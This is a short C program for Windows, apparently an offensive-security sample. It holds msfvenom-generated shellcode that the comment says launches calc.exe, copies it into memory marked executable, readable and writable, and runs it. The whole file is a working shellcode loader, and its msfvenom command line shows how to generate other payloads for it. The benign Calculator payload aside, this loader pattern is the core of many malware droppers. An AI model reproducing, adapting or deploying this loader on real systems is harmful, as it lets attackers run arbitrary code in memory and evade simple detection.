#include <windows.h>
int main()
{
    //msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -b \x00
    unsigned char shellcode[] =
        "\xdb\xd5\xbe\xee\x3e\x9f\x2d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
        "\x31\x31\x70\x18\x83\xc0\x04\x03\x70\xfa\xdc\x6a\xd1\xea\xa3"
        "\x95\x2a\xea\xc3\x1c\xcf\xdb\xc3\x7b\x9b\x4b\xf4\x08\xc9\x67"
        "\x7f\x5c\xfa\xfc\x0d\x49\x0d\xb5\xb8\xaf\x20\x46\x90\x8c\x23"
        "\xc4\xeb\xc0\x83\xf5\x23\x15\xc5\x32\x59\xd4\x97\xeb\x15\x4b"
        "\x08\x98\x60\x50\xa3\xd2\x65\xd0\x50\xa2\x84\xf1\xc6\xb9\xde"
        "\xd1\xe9\x6e\x6b\x58\xf2\x73\x56\x12\x89\x47\x2c\xa5\x5b\x96"
        "\xcd\x0a\xa2\x17\x3c\x52\xe2\x9f\xdf\x21\x1a\xdc\x62\x32\xd9"
        "\x9f\xb8\xb7\xfa\x07\x4a\x6f\x27\xb6\x9f\xf6\xac\xb4\x54\x7c"
        "\xea\xd8\x6b\x51\x80\xe4\xe0\x54\x47\x6d\xb2\x72\x43\x36\x60"
        "\x1a\xd2\x92\xc7\x23\x04\x7d\xb7\x81\x4e\x93\xac\xbb\x0c\xf9"
        "\x33\x49\x2b\x4f\x33\x51\x34\xff\x5c\x60\xbf\x90\x1b\x7d\x6a"
        "\xd5\xd4\x37\x37\x7f\x7d\x9e\xad\xc2\xe0\x21\x18\x00\x1d\xa2"
        "\xa9\xf8\xda\xba\xdb\xfd\xa7\x7c\x37\x8f\xb8\xe8\x37\x3c\xb8"
        "\x38\x54\xa3\x2a\xa0\xb5\x46\xcb\x43\xca";
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void (*)())exec)();
    return 0;
}